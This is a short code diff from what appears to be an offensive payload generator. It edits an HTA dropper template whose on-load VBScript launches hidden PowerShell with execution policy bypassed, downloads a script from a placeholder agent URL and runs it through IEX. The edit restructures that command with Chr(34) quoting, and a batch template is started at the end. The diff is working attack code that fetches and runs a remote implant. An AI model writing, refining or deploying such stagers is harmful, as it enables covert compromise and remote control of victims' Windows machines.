@@ -36,7 +36,7 @@ DANGER = DangerLevel.BLACK
 
 # ── Templates ──────────────────────────────────────────────────────────────────
 
-_HTA_TEMPLATE = """\
+_HTA_TEMPLATE = '''\
 <html>
 <head>
 <HTA:APPLICATION
@@ -54,8 +54,10 @@ _HTA_TEMPLATE = """\
 Sub Window_OnLoad
     Dim oWsh
     Set oWsh = CreateObject("WScript.Shell")
-    oWsh.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile " & _
-             "-Command ""(New-Object Net.WebClient).DownloadString('{AGENT_URL}') | IEX""", 0, False
+    Dim cmd
+    cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "
+    cmd = cmd & Chr(34) & "(New-Object Net.WebClient).DownloadString('{AGENT_URL}')|IEX" & Chr(34)
+    oWsh.Run cmd, 0, False
     Self.Close
 End Sub
 </script>
@@ -70,7 +72,7 @@ End Sub
 <style>@keyframes slide{0%{margin-left:-50%}100%{margin-left:110%}}</style>
 </body>
 </html>
-"""
+'''
 
 _BAT_TEMPLATE = """\
 @echo off
